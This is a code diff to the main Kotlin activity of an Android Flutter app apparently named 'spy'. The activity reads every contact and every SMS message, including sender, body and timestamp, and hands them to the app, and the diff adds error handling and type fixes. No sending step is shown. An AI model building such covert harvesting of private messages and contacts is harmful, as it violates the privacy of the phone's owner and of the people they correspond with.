@@ -1,7 +1,6 @@
 package com.anjesh.spy
 
 import android.database.Cursor
-import android.os.Bundle
 import android.provider.ContactsContract
 import android.provider.Telephony
 import io.flutter.embedding.android.FlutterActivity
@@ -16,9 +15,16 @@ class MainActivity: FlutterActivity() {
         MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL).setMethodCallHandler { call, result ->
             when (call.method) {
                 "getContactsAndSms" -> {
-                    val contacts = getContacts()
-                    val smsList = getSms()
-                    result.success(mapOf("contacts" to contacts, "sms" to smsList))
+                    try {
+                        val contacts = getContacts()
+                        val smsList = getSms()
+                        result.success(mapOf(
+                            "contacts" to contacts,
+                            "sms" to smsList
+                        ))
+                    } catch (e: Exception) {
+                        result.error("DATA_ERROR", e.message, null)
+                    }
                 }
                 else -> result.notImplemented()
             }
@@ -34,19 +40,22 @@ class MainActivity: FlutterActivity() {
 
         cursor?.use {
             while (it.moveToNext()) {
-                val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
-                val phone = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
-                list.add(mapOf("name" to name, "phone" to phone))
+                val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) ?: ""
+                val phone = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)) ?: ""
+                list.add(mapOf(
+                    "name" to name,
+                    "phone" to phone
+                ))
             }
         }
-
         return list
     }
 
-    private fun getSms(): List<Map<String, String>> {
-        val list = mutableListOf<Map<String, String>>()
+    private fun getSms(): List<Map<String, Any>> {
+        val list = mutableListOf<Map<String, Any>>()
         val cursor: Cursor? = contentResolver.query(
-            Telephony.Sms.CONTENT_URI, null, null, null,
+            Telephony.Sms.CONTENT_URI, 
+            null, null, null,
             Telephony.Sms.DEFAULT_SORT_ORDER
         )
 
@@ -54,12 +63,14 @@ class MainActivity: FlutterActivity() {
             while (it.moveToNext()) {
                 val address = it.getString(it.getColumnIndexOrThrow("address")) ?: ""
                 val body = it.getString(it.getColumnIndexOrThrow("body")) ?: ""
-                val date = it.getString(it.getColumnIndexOrThrow("date")) ?: ""
-                list.add(mapOf("address" to address, "body" to body, "timestamp" to date))
+                val date = it.getLong(it.getColumnIndexOrThrow("date"))
+                list.add(mapOf(
+                    "address" to address,
+                    "body" to body,
+                    "timestamp" to date
+                ))
             }
         }
-
         return list
     }
 }
-
